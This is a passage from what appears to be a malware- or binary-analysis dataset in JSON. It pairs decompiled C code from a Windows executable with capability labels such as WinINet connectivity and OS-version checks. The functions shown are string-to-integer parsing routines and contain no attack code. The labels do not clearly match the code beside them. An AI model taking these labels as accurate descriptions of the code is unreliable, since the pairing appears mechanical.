        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140053430(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint16_t uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint16_t *in_stack_00000038;\n    uint16_t uStack156;\n    int64_t iStack152;\n    uint32_t uStack136;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x000140053498:\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x0001400534b7:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bVar25 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bVar25 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x0001400537d2;\n                    goto code_r0x0001400534f6;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x0001400534f6;\ncode_r0x0001400537d2:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.1400240d0(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x0001400534f6;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x0001400534f6:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x000140053529;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140053529:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x0001400535d2;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x0001400535dc;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140053592;\ncode_r0x000140053a40:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140053a40;\ncode_r0x000140053592:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x0001400535d2;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x0001400535d2:\n            if (uVar20 == 0x10) goto code_r0x000140053841;\n        }\n        else {\n            bVar25 = false;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x0001400535dc:\n        iStack152 = uVar20;\n        uStack136 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x000140053498;\n        uVar20 = 0x10;\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x0001400534b7;\n        bVar25 = false;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x000140053841:\n        uStack136 = 0x10;\n        uVar20 = 0x16;\n        iStack152 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar2 = *(iVar13 + 200);\n    uStack156 = 0xffff / uStack136;\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            iVar19 = 0;\ncode_r0x00014005364c:\n            uVar18 = iVar19;\n            uVar23 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack152 + 0x30U <= uVar11)) goto code_r0x000140053920;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140053ac4;\n                iVar12 = uVar23 - 0x57;\n                goto code_r0x000140053671;\n            }\n            iVar12 = uVar23 - 0x30;\ncode_r0x000140053671:\n            do {\n                piVar4 = piStack104;\n                if (uStack156 < iVar19) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar23 = iVar19 * uStack136;\n                    iVar19 = uVar23 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | 0xffff - iVar12 < uVar23;\n                }\n                uVar18 = iVar19;\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar10 = *piVar15;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar24) {\n                    uVar2 = 1;\n                    goto code_r0x00014005370d;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x00014005364c;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x000140053920;\n                uVar23 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140053ac4:\n                uVar18 = iVar19;\n                if (5 < uVar11 - 0x41) goto code_r0x000140053920;\n                iVar12 = uVar23 - 0x37;\n            } while( true );\n        }\n        uVar18 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            iVar19 = 0;\ncode_r0x000140053b00:\n            uVar18 = iVar19;\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack152;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140053920;\n                while (uVar11 != *puVar16) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x000140053920;\n                }\n                iVar12 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar18 <= uStack156) {\n                    iVar19 = uVar18 * uStack136 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | 0xffff - iVar12 < uVar18 * uStack136;\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x00014005370d;\n                }\n                fcn.140077ac0(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            uVar18 = iVar19;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar10 = *piVar15;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar24) goto code_r0x00014005370d;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140053b00;\n        }\n        uVar18 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x00014005370d:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140053935;\ncode_r0x000140053720:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x000140053979:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                if (bVar25) {\n                    uVar18 = -uVar18;\n                }\n                *in_stack_00000038 = uVar18;\n            }\n            else {\n                *in_stack_00000038 = 0xffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140053750;\n        }\n    }\n    goto code_r0x000140053733;\ncode_r0x000140053920:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140053720;\ncode_r0x000140053935:\n    fcn.140077ac0(aiStack80, iVar21);\n    cVar8 = fcn.1400b15c0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140053979;\ncode_r0x000140053733:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140053750:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4538
    },
    "140053ee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140053ee0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int16_t *piVar16;\n    uint16_t *puVar17;\n    uint64_t uVar18;\n    int64_t iVar19;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    uint8_t uVar24;\n    uint32_t uVar25;\n    bool bVar26;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    int64_t iStack168;\n    bool bStack137;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar25 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar25 == 0x40) {\n        uVar22 = 8;\ncode_r0x000140053f48:\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140053f67:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bStack137 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bStack137 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x0001400542aa;\n                    goto code_r0x000140053fa6;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140053fa6;\ncode_r0x0001400542aa:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.1400240d0(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x000140053fa6;\n                }\n                iVar23 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140053fa6:\n                iVar23 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar22 == 10;\n                        if (!bVar3) goto code_r0x000140053fd9;\n                        bVar26 = uVar22 == 8;\n                        if (bVar26 || uVar25 == 0) {\n                            iVar23 = 0;\n                            uVar22 = 8;\n                            bVar3 = bVar26 || uVar25 == 0;\n                        }\n                        else {\n                            iVar23 = iVar23 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140053fd9:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140054082;\n                        }\n                        uVar7 = uVar22 == 0x10 || uVar25 == 0;\n                        if (uVar22 != 0x10 && uVar25 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005408c;\n                        }\n                        iVar23 = 0;\n                        uVar22 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140054042;\ncode_r0x000140054540:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140054540;\ncode_r0x000140054042:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar26 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar26)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar26 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar26) {\n                        uVar7 = 1;\n                        goto code_r0x000140054082;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140054082:\n            if (uVar22 == 0x10) goto code_r0x000140054319;\n        }\n        else {\n            bStack137 = false;\n            uVar11 = 0;\n            iVar23 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005408c:\n        iStack168 = uVar22;\n        uVar25 = uVar22;\n    }\n    else {\n        uVar22 = 10;\n        if (uVar25 != 8) goto code_r0x000140053f48;\n        uVar22 = 0x10;\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140053f67;\n        bStack137 = false;\n        uVar11 = 0;\n        iVar23 = 0;\n        bVar3 = false;\ncode_r0x000140054319:\n        iStack168 = 0x16;\n        uVar25 = 0x10;\n        uVar22 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar18 = uVar25;\n    uVar15 = bStack137 + 0x7fffffffffffffff;\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar24 = 0;\n        if (uVar7 == 0) {\n            uVar21 = 0;\ncode_r0x00014005411a:\n            uVar25 = uVar11;\n            if (uVar22 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack168 + 0x30U <= uVar11)) goto code_r0x0001400543f8;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x0001400545c4;\n                iVar12 = uVar25 - 0x57;\n                goto code_r0x00014005413f;\n            }\n            iVar12 = uVar25 - 0x30;\ncode_r0x00014005413f:\n            do {\n                piVar4 = piStack104;\n                if (uVar15 / uVar18 < uVar21) {\n                    uVar24 = 1;\n                }\n                else {\n                    uVar20 = uVar21 * uVar18;\n                    uVar21 = uVar20 + iVar12;\n                    iVar23 = iVar23 + 1;\n                    uVar24 = uVar24 | uVar15 - iVar12 < uVar20;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar16 = piStack104[2] + 1;\n                    piStack104[2] = piVar16;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar16 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar16 < piVar14) {\n                    iVar10 = *piVar16;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar26 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar26)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar26 = iVar9 == -1;\n                }\n                if (bVar26 == (iVar10 == -1)) {\n                    uVar2 = 1;\n                    goto code_r0x0001400541de;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x00014005411a;\n                    piStack104 = NULL;\n                }\n                if (uVar22 < 0xb) goto code_r0x0001400543f8;\n                uVar25 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x0001400545c4:\n                if (5 < uVar11 - 0x41) goto code_r0x0001400543f8;\n                iVar12 = uVar25 - 0x37;\n            } while( true );\n        }\n        uVar21 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar24 = 0;\n            uVar21 = 0;\ncode_r0x000140054603:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar17 = iVar13 + 0x9c;\n                iVar19 = iStack168;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x0001400543f8;\n                while (*puVar17 != uVar11) {\n                    iVar19 = iVar19 + -1;\n                    puVar17 = puVar17 + 1;\n                    if (iVar19 == 0) goto code_r0x0001400543f8;\n                }\n                iVar12 = puVar17 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar21 <= uVar15 / uVar18) {\n                    uVar20 = uVar21 * uVar18;\n                    uVar21 = uVar20 + iVar12;\n                    iVar23 = iVar23 + 1;\n                    uVar6 = uVar24 | uVar15 - iVar12 < uVar20;\n                }\n            }\n            else {\n                if (iVar23 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x0001400541de;\n                }\n                fcn.140077ac0(aiStack80, iVar23);\n                iVar23 = 0;\n                uVar6 = uVar24;\n            }\n            uVar24 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar16 = piStack104[2] + 1;\n                piStack104[2] = piVar16;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar16 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar16 < piVar14) {\n                iVar10 = *piVar16;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar26 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar26)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar26 = iVar9 == -1;\n            }\n            if (bVar26 == (iVar10 == -1)) goto code_r0x0001400541de;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140054603;\n        }\n        uVar21 = 0;\n        uVar24 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x0001400541de:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140054410;\ncode_r0x0001400541f8:\n    if ((iVar23 != 0) || (bVar3)) {\ncode_r0x00014005445a:\n        if (uVar7 == 0) {\n            if (uVar24 == 0) {\n                uVar15 = -uVar21;\n                if (bStack137 == false) {\n                    uVar15 = uVar21;\n                }\n                *in_stack_00000038 = uVar15;\n            }\n            else {\n                uVar15 = 0x7fffffffffffffff;\n                if (bStack137 != false) {\n                    uVar15 = 0x8000000000000000;\n                }\n                *in_stack_00000038 = uVar15;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140054228;\n        }\n    }\n    goto code_r0x00014005420b;\ncode_r0x0001400543f8:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x0001400541f8;\ncode_r0x000140054410:\n    fcn.140077ac0(aiStack80, iVar23);\n    cVar8 = fcn.1400b15c0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar23 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014005445a;\ncode_r0x00014005420b:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140054228:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar23 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar23 == 0) {\n        iVar23 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar23 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar23 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar23 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4590
    },
    "1400549e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.1400549e0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int16_t *piVar17;\n    uint16_t *puVar18;\n    uint64_t uVar19;\n    int64_t iVar20;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint64_t uVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    uint8_t uVar24;\n    uint32_t uVar25;\n    bool bVar26;\n    bool bVar27;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    int64_t iStack160;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    